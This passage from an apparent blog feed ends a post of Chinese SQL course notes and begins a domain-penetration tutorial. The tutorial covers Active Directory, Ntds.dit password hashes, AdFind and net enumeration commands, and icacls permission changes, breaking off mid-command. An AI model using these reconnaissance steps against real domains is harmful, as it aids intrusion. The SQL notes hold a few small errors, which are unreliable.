title="1.并"></a>1.并</h5><p>使用UNION或OR</p><p>查询计算机科学系的学生及年龄不大于19岁的学生</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> </span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">19</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">OR</span> Sage<span class="operator">&lt;=</span><span class="number">19</span></span><br></pre></td></tr></table></figure><h5 id="2-交"><a href="#2-交" class="headerlink" title="2.交"></a>2.交</h5><p>使用INTERSECT</p><p>查询单价小于50的商品与库存量大于20的商品的交集</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> 单价<span class="operator">&lt;</span><span class="number">50</span></span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> 库存量<span class="operator">&gt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="3-差"><a href="#3-差" class="headerlink" title="3.差"></a>3.差</h5><p>使用EXCEPT</p><p>查询单价小于50的商品与库存量大于20的商品的差集</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> 单价<span class="operator">&lt;</span><span class="number">50</span></span><br><span class="line"><span class="keyword">EXCEPT</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> 库存量<span class="operator">&gt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="4-集合查询排序"><a href="#4-集合查询排序" class="headerlink" title="4.集合查询排序"></a>4.集合查询排序</h5><p>ORDER BY 子句只能用于对最终查询结果排序</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdep<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sage<span class="operator">&lt;=</span><span class="number">19</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sno</span><br></pre></td></tr></table></figure><h3 id="3-5数据更新"><a href="#3-5数据更新" class="headerlink" title="3.5数据更新"></a>3.5数据更新</h3><p>插入语句:INSERT</p><p>两种插入方式:1.插入单个元祖2.插入子查询结果</p><h5 id="1-数据插入"><a href="#1-数据插入" class="headerlink" title="1.数据插入"></a>1.数据插入</h5><p>1.插入元祖</p><p>插入一条选课记录(‘95020’,’1’)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC(Sno,Cno) <span class="keyword">VALUES</span>(<span class="string">&#x27;95020&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.插入子查询结果</p><p>对每一个系,求学生的平均年龄,并把结果存入数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*第一步建表*/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Deptage</span><br><span class="line">(</span><br><span class="line">Sdept <span class="type">CHAR</span>(<span class="number">15</span>) <span class="keyword">PRIMARY</span> KEY, <span class="comment">/*系名*/</span></span><br><span class="line">    Avgage <span class="type">SMALLINT</span>  <span class="comment">/*学生平均年龄*/</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">/*第二步插入数据*/</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Deptage(Sdept,Avgage)</span><br><span class="line"><span class="keyword">SELECT</span> Sdept,<span class="built_in">AVG</span>(Sage) <span class="keyword">FROM</span> Student <span class="keyword">GROUP</span> <span class="keyword">BY</span> Sdept</span><br></pre></td></tr></table></figure><h5 id="2-数据修改"><a href="#2-数据修改" class="headerlink" title="2.数据修改"></a>2.数据修改</h5><p>将所有学生的年龄增加1岁</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> Student <span class="keyword">SET</span> Sage<span class="operator">=</span>Sage<span class="operator">+</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>将计算机系全体学生的成绩置零</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> SC <span class="keyword">SET</span> Grade<span class="operator">=</span><span class="number">0</span> <span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> (<span class="keyword">SELECT</span> Sno <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-数据删除"><a href="#3-数据删除" class="headerlink" title="3.数据删除"></a>3.数据删除</h5><p>DELETE删除的是表中的数据,不是表的结构.</p><p>DROP删除的不仅是标的内容还有表的定义</p><p>删除商品订购数据库的CustomerInfo表中编号为100007的客户信息</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> CustomerInfo <span class="keyword">WHERE</span> 客户编号<span class="operator">=</span><span class="string">&#x27;100007&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="4-索引定义"><a href="#4-索引定义" class="headerlink" title="4.索引定义"></a>4.索引定义</h5><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020833197.png" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020835802.png" style="zoom:67%;" /><p>删除索引: DROP INDEX &lt;基本表名&gt;.&lt;索引名&gt;</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX CustomerInfo.CustomerID_ind</span><br></pre></td></tr></table></figure><h3 id="3-6视图"><a href="#3-6视图" class="headerlink" title="3.6视图"></a>3.6视图</h3><h5 id="1-视图定义"><a href="#1-视图定义" class="headerlink" title="1.视图定义"></a>1.视图定义</h5><p>从一个或多个基本表(或视图)导出的表。视图是一个虚表，数据库中值存储视图的定义。</p><p>1.创建视图Customer_NJview,其内容为江苏南京的客户信息</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Customer_NJview</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> CustomerInfo</span><br><span class="line"><span class="keyword">WHERE</span> 所在省市<span class="operator">=</span><span class="string">&#x27;江苏南京&#x27;</span></span><br></pre></td></tr></table></figure><p>创建视图OrderList_NJview 其内容为江苏南京的客户编号及其订购的商品编号</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> OrderList_NJview</span><br><span class="line"><span class="keyword">AS</span> </span><br><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span>,商品编号</span><br><span class="line"><span class="keyword">FROM</span> CustomerInfo a,OrderList b</span><br><span class="line"><span class="keyword">WHERE</span> a.所在省市<span class="operator">=</span><span class="string">&#x27;江苏南京&#x27;</span> <span class="keyword">AND</span> a.客户编号<span class="operator">=</span>b.客户编号</span><br></pre></td></tr></table></figure><p>创建”江苏南京”订购了编号为10010001商品的所有客户的客户编号、客户姓名视图Order_NJView_2</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Order_NJView_2(客户编号,客户姓名)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> 客户编号,客户姓名</span><br><span class="line"><span class="keyword">FROM</span> OrderList_NJview</span><br><span class="line"><span class="keyword">WHERE</span> 商品编号<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span></span><br></pre></td></tr></table></figure><p>2.修改视图Order_NJView_2,使其内容是选购了编号为30010001的所有江苏南京客户的客户编号,客户姓名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> Order_NJView_2</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> 客户编号,客户姓名</span><br><span class="line"><span class="keyword">FROM</span> OrderList_NJView</span><br><span class="line"><span class="keyword">WHERE</span> 商品编号<span class="operator">=</span><span class="string">&#x27;30010001&#x27;</span></span><br></pre></td></tr></table></figure><p>3.删除视图OrderList_NJView</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> OrderList_NJView</span><br></pre></td></tr></table></figure><h5 id="2-视图查询"><a href="#2-视图查询" class="headerlink" title="2.视图查询"></a>2.视图查询</h5><p>查询视图与查询表相同</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span></span><br></pre></td></tr></table></figure><p>在信息系学生视图中找出年龄小于20岁的学生</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sage,</span><br><span class="line"><span class="keyword">FROM</span> IS_Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><h5 id="3-视图更新"><a href="#3-视图更新" class="headerlink" title="3.视图更新"></a>3.视图更新</h5><p>1.插入数据:INSERT</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> CInfo_JS(客户编号,客户姓名,性别,出生日期,所在省市) <span class="keyword">VALUES</span>(<span class="string">&#x27;100008&#x27;</span>,<span class="string">&#x27;赵平&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="string">&#x27;1993-5-19&#x27;</span>,<span class="string">&#x27;江苏南京&#x27;</span>)</span><br></pre></td></tr></table></figure><p>2.修改数据:INSERT</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> IS_Student <span class="keyword">SET</span> Sname<span class="operator">=</span><span class="string">&#x27;刘晨&#x27;</span> <span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;95002&#x27;</span></span><br></pre></td></tr></table></figure><p>3.删除数据:DELETE</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> CInfo_JS <span class="keyword">WHERE</span> 客户编号<span class="operator">=</span><span class="string">&#x27;100008&#x27;</span></span><br></pre></td></tr></table></figure><p>4.为了防止用户通过对视图数据进行更新时,对不属于试图范围内的基本表数据进行操作,可在定义视图时加上WITH CHECK OPTION</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student_1</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION</span><br></pre></td></tr></table></figure><p>视图更新</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020857780.png" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020858791.png" style="zoom:67%;" /><h2 id="4-数据库设计"><a href="#4-数据库设计" class="headerlink" title="4.数据库设计"></a>4.数据库设计</h2><p>1.信息系统是提供信息、辅助人们对环境进行控制和进行决策的系统<br>数据库是信息系统的核心和基础。</p><p>2.数据库的设计的目标：为用户和各种应用系统提供一个信息基础设施和高效率的运行环境，包括：<br>数据的存储效率，存储空间利用率，系统运行管理效率</p><p>3.数据库设计的基本步骤</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020907265.png" style="zoom: 67%;" /><p>4.E-R图像关系模式的转换</p><p>a. 1:1 联系</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020910218.png" style="zoom:67%;" /><p>例:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020911768.png" style="zoom:67%;" /><p>b. 1:N联系</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020912509.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020918872.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020918963.png"></p><p>c.M:N联系</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020919865.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020919008.png"></p><h2 id="5-关系规范化理论"><a href="#5-关系规范化理论" class="headerlink" title="5.关系规范化理论"></a>5.关系规范化理论</h2><p>实在来不及了,看的这个速成</p><p><a href="https://www.bilibili.com/video/BV1Bq4y1Y7GC?p=2&vd_source=3a0549a10a00b9b6b6653658bbdb92b2">https://www.bilibili.com/video/BV1Bq4y1Y7GC?p=2&vd_source&#x3D;3a0549a10a00b9b6b6653658bbdb92b2</a></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 理论课 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透(一)-内网基础知识</title>
      <link href="/2023/08/30/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%80)-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/08/30/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%80)-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="1-活动目录-AD"><a href="#1-活动目录-AD" class="headerlink" title="1.活动目录(AD)"></a>1.活动目录(AD)</h2><h3 id="1-1Ntds-dit文件"><a href="#1-1Ntds-dit文件" class="headerlink" title="1.1Ntds.dit文件"></a>1.1Ntds.dit文件</h3><ol><li>活动目录是安装在域控上，存储了域各种信息的组件。</li><li>目录数据存储在NTds.dit文件中，Ntds.dit文件时域控的一个二进制文件，其位置为”%SystemRoot%\ntds\ntds.dit”。</li><li>Ntds.dit文件中存储有关域用户、用户密码的哈希散列值、用户组、组成员身份和组策略信息等。</li><li>Ntds.dit文件使用存储在SYSTEM文件的密钥对这些哈希值进行加密</li><li>在非域环境中，用户的登陆凭据存储在SAM文件中</li></ol><h3 id="1-2目录服务与LDAP"><a href="#1-2目录服务与LDAP" class="headerlink" title="1.2目录服务与LDAP"></a>1.2目录服务与LDAP</h3><p>1.活动目录是一种目录服务数据库，利用LDAP服务名称路径来描述对象在活动目录中的位置。<br>2.DN:绝对可辨识名称，指向一个LDAP对象的完整路径<br>3.RDN：用于指向一个LDAP对象的相对路径<br>4.活动目录的访问:可以里利用微软官方的AD Explorer工具连接域控制器来访问<br><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer">下载链接</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302118006.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302120579.png"><br>5.活动目录分区:域分区、配置分区、架构分区</p><h3 id="1-3活动目录的查询"><a href="#1-3活动目录的查询" class="headerlink" title="1.3活动目录的查询"></a>1.3活动目录的查询</h3><p>1.LDAP按位查询<br>按位查询语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;属性名称&gt;:&lt;BitFilterRule-ID&gt;:=&lt;十进制的位值&gt;</span><br><span class="line">BitFilterRule-ID:查询规则对应的ID</span><br><span class="line">十进制的位值:对应查询属性的位的十进制值的和</span><br></pre></td></tr></table></figure><p>位查询规则<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302133055.png"><br>部分属性信息<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302134402.png"><br>例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(userAccountControl:1.2.840.113556.1.4.803:=131080)</span><br><span class="line">查询属性为userAccountControl</span><br><span class="line">1.2.840.113556.1.4.803 位查询规则为AND</span><br><span class="line">131080代表查询的是HOMEDIR_REQUIRED(8)和MNS_LOGON_ACCOUN(131072)两个位</span><br></pre></td></tr></table></figure><p>2.ADFind查询活动目录<br><a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml#download">下载链接</a><br>Adfind可以在域内任何一台主机上用,查询语法为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe [switches] [-b basedn] [-f filter] [attr list]</span><br><span class="line">-b 指定一个BaseDN作为查询的根</span><br><span class="line">-f 为LDAP过滤条件</span><br><span class="line">attr list 为需要显示的属性</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b dc=hack-my,dc=com -f &quot;objectClass=computer&quot; name operatingSystem</span><br><span class="line">-b 指定查询hack-my.com域</span><br><span class="line">-f 指定查询所有computer对象</span><br><span class="line">name operatingSystem 并且过滤对象的name 和operatingSystem属性</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302146854.png"></p><p>常用查询<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302148133.png"><br>Adfind也支持按位查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b dc=hack-my, dc=com -f &quot;(userAccountControl:AND:=131080)&quot; -bit -dn</span><br></pre></td></tr></table></figure><h2 id="2-域用户与机器用户介绍"><a href="#2-域用户与机器用户介绍" class="headerlink" title="2.域用户与机器用户介绍"></a>2.域用户与机器用户介绍</h2><h3 id="2-1域用户"><a href="#2-1域用户" class="headerlink" title="2.1域用户"></a>2.1域用户</h3><p>1.域用户是域环境中的用户，在域控中被创建，所有信息保存在活动目录中<br>2.域用户位于全局组Domain Users<br>计算机本地用户位于本地User组中，计算机加入域时，全局组Domain Users会被添加到计算机本地User组中<br>3.在任一计算机中执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p>可以查看域中所有用户<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302150542.png"></p><h3 id="2-2机器用户"><a href="#2-2机器用户" class="headerlink" title="2.2机器用户"></a>2.2机器用户</h3><p>1.机器用户拥有域用户的属性<br>2.域环境中，计算机本地用户SYSTEM对应域中的机器账户，在域中的用户名是 “机器名+$”<br>3.查看域中所有的机器用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure><p>4.在获取域中主机时可能权限受限，提升到SYSTEM权限可执行更多命令。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302153209.png"></p><h2 id="3-域用户组的分类和权限"><a href="#3-域用户组的分类和权限" class="headerlink" title="3.域用户组的分类和权限"></a>3.域用户组的分类和权限</h2><p>组分为通讯组和安全组，通讯组:通讯发消息，安全组:用户权限的集合</p><h3 id="安全组的权限"><a href="#安全组的权限" class="headerlink" title="安全组的权限"></a>安全组的权限</h3><h4 id="1-域本地组"><a href="#1-域本地组" class="headerlink" title="1.域本地组"></a>1.域本地组</h4><p>1.域本地主要用于访问同一个域中的资源。<br>2.除了本组的用户，域本地组还可以包含域林内的任何一个域和通用组、全局组的用户<br>3.域本地组只能够访问本域中的资源，无法访问其他不同域中的资源<br>4.查询所有域本地组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;dc=hack-my, dc=com&quot; -bit -f &quot;(&amp;(objectClass=group)(grouptype:AND:=4))&quot; cn -dn</span><br></pre></td></tr></table></figure><p>域本地组在活动目录中都是Group类的实例,而域组的作用类型是由其groupType属性决定的,该属性是一个位属性<br>5.常见的系统内置的域本地组有:Administrators管理员组,Print Operators:打印机操作组,Backup Operators:备份操作组,Remote  Desktop Users:远程登录组,Account Operators 账号操作组,Server Operators:服务器操作员组</p><h4 id="2-通用组"><a href="#2-通用组" class="headerlink" title="2.通用组"></a>2.通用组</h4><p>1.通用组可以作用于域林的所有与,其成员可以包括域林中任何域的用户账户、全局组和其他通用组，但是无法包含任何一个域中的域本地组<br>2.通用组可以在域林的任何域中被指派访问权限，以便访问所有域中的资源。域管理员进行域管理时，可以为通用组授予对域林中所有域的资源访问权限，而不想需要考虑此通用组所在的位置<br>3.查询寻所有的通用组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b dc=hack-my,dc=com -bit -f &quot;(&amp;(objectClass=group)(grouptype:AND:=8))&quot; cn -dn</span><br></pre></td></tr></table></figure><p>4.常见的系统内置通用组<br>Enterprise Admins:组织系统管理员组,该组中的成员在域林每个域中都是Administrators组的权限<br>Schema Admins:架构管理员组,该组中的成员可以修改活动目录,如在架构分区中新增类或属性</p><h4 id="3-全局组"><a href="#3-全局组" class="headerlink" title="3.全局组"></a>3.全局组</h4><p>1.全局组可以作用于域林的所有域,是介于域本地组和通用组的组<br>2.全局组只能包含本域的用户<br>3.全局组可以嵌套在同一个域的另一个全局组中,也可以嵌套在其他域的通用组或本地组中<br>4.全局组可以在域林的任何域中被指派访问权限<br>5.查询所有的全局组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;dc=hack-my,dc=com&quot; -bit -f &quot;(&amp;(objectClass=group)(grouptype:AND:=2))&quot; cn -dn</span><br></pre></td></tr></table></figure><p>6.常见的系统内置的全局组:<br>Domain Admins:域管理员组<br>Domain Users:域用户组<br>Domain Computers:域成员主机组</p><h2 id="4-组织单位"><a href="#4-组织单位" class="headerlink" title="4.组织单位"></a>4.组织单位</h2><p>1.组织单位是一个可以将域中的用户、组、计算机等对象放入其中的容器对象，是可以指派组策略或委派管理权限的最小作用域或单元。<br>2.组织单位可以统一管理组织单位中的域对象，包括且不限于：用户、计算机、工作组、打印机、安全策略等<br>3.在组织域环境中经常可以看到按照部门划分的一个个组织单位<br>4.所有组织单位在活动目录中都是organizationUnit类的实例,可以通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(objectClass=organizationalUnit)</span><br><span class="line">(objectCategory=organizationalUnit)</span><br></pre></td></tr></table></figure><p>来查询所有的OU</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;dc=hack-my,dc=com&quot; -f &quot;(objectClass=organizationalUnit)&quot; -dn</span><br></pre></td></tr></table></figure><p>将BaseDN设定为指定的组织单元，便可以查询其中指定的对象</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Adfind.exe -b &quot;OU=科研中心, DC=hack-my, DC=com&quot; -dn</span><br></pre></td></tr></table></figure><h2 id="5-访问控制"><a href="#5-访问控制" class="headerlink" title="5.访问控制"></a>5.访问控制</h2><p>1.访问控制是Windows操作系统使用内置授权和访问控制技术，确定经过身份验证的用户是否具有访问资源的正确权限，以控制主体操作对象的行为是否具有合法权限</p><p>2.Windows中，访问主题通常指安全主体。安全主体是任何可通过操作系统进行身份验证的实体，如用户账户，计算机账户等。被访问的对象通常指安全对象，可能是文件、文件夹、注册表项等。</p><p>3.当经过身份验证，Windows会为安全主题创建一个访问令牌，其中包含验证过程返回的SID和本地安全策略分配给用户的用户权限列表。</p><p>4.当安全对象被创建时，Windows会为其创建一个安全描述符，Windows的访问控制正式将安全主体的访问令牌中的信息于安全对象的安全描述中的访问控制项进行比较做出访问决策的。</p><h3 id="1-Windows访问控制模型"><a href="#1-Windows访问控制模型" class="headerlink" title="1.Windows访问控制模型"></a>1.Windows访问控制模型</h3><h4 id="1-1访问令牌"><a href="#1-1访问令牌" class="headerlink" title="1.1访问令牌"></a>1.1访问令牌</h4><p>用户登录时，Windows对用户身份进行验证，验证通过为用户创建一个访问令牌。该令牌包括登录过程返回的SID、由本地安全策略分配给用户和用户所属安全组的特权列表</p><p>访问令牌主要包含信息:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302344914.png"></p><h4 id="1-2安全描述符"><a href="#1-2安全描述符" class="headerlink" title="1.2安全描述符"></a>1.2安全描述符</h4><p>1.安全描述符是一种与每个安全对象相关联的数据结构，其中包含与安全对象相关联的安全信息。<br>2.安全对象被创建时，操作系统会为其创建一个安全描述符。<br>3.安全描述符主要有SID和ACL组成。SID用来表示用户账户和该用户所属的组,ACL(访问控制列表)分为DACL和SACL两种。</p><h3 id="2-访问控制列表"><a href="#2-访问控制列表" class="headerlink" title="2.访问控制列表"></a>2.访问控制列表</h3><p>ACL是访问控制项(ACE)的列表, 每个访问控制项制定了一系列访问权限。</p><p>假设有安全主体A和安全对象B, 当A访问B,A会出示自己的访问令牌,其中包含自己的用户SID,所属用户组的SID和特权列表。<br>安全对象B有自己的访问控制列表,会先判断自己是不是需要特权才能访问,如果需要特权,就根据安全主体A的访问令牌查看自己是否具有该特权。然后安全对象B将安全主体A的访问令牌与自己的访问控制列表比对，并决定是否让A访问。</p><p>此过程中，访问控制列表主要的两个作用: 1.进行访问权限控制,判断安全主体能不能访问该安全对象。<br>2.日志记录功能,对用户访问行为的成功与否进行日志记录。</p><h4 id="2-1-DACL"><a href="#2-1-DACL" class="headerlink" title="2.1 DACL"></a>2.1 DACL</h4><p>1.DACL(自主访问控制列表)是安全对象的访问控制策略,其中定义了该安全对象的访问控制策略,用于指定允许或拒绝特定安全主体对该安全对象的访问。<br>2.DACL是由一条条的访问控制项ACE条目构成的,每条ACE定义了哪些用户或组队该对象拥有怎样的访问权限。每个ACE指定了一组访问权限，并包含一个SID。该SID标识了允许或拒绝访问该安全对象的安全主体。<br>3.如果安全对象没有配置DACL,则系统默认允许所有访问操作<br>如果配置了DACL没有配置ACE条目,系统默认拒绝所有访问操作<br>如果系统配置了DACL和ACE,那么系统将按顺序读取ACE,直到找到一个或多个允许或拒绝安全对象访问行为的ACE。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310923359.png"></p><h4 id="2-2-SACL"><a href="#2-2-SACL" class="headerlink" title="2.2 SACL"></a>2.2 SACL</h4><p>1.SACL(系统访问控制列表)是安全主体对安全对象的访问行为的审计策略,也是由一条条ACE条目构成。<br>2.每条ACE定义了对哪些安全主体的哪些访问行为进行日志记录。安全主体的访问行为满足这条ACE就会被记录。<br>可以把一条ACE归纳为4方面: 1.谁对这个安全对象拥有控制权限 2.拥有什么权限 3. 这个权限是允许还是拒绝 4. 这个权限能不能继承</p><h4 id="2-3-查看与修改访问控制列表"><a href="#2-3-查看与修改访问控制列表" class="headerlink" title="2.3 查看与修改访问控制列表"></a>2.3 查看与修改访问控制列表</h4><p>Icacls 是一种命令行工具,使用icacls命令可以查看或修改指定文件上的访问控制列表,并将存储的DACL应用于指定目录中的文件。</p><p>例如,执行以下命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Users\Alice\Desktop\test.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310927909.png"></p><p>权限说明:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310929931.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310929523.png"></p><p>将指定目录及子目录下所有文件的ACLl备份到AcFile.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\USers\Alice\Desktop\* /save AcFile.txt /T</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310933307.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311324551.png"></p><p>执行以下命令将AcFile.txt内所有备份的文件ACL还原到指定目录及子目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Users\Alice\Desktop\ /restore AcFile.txt</span><br></pre></td></tr></table></figure><p>给用户Hacker添加指定文件或目录的完全访问权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls 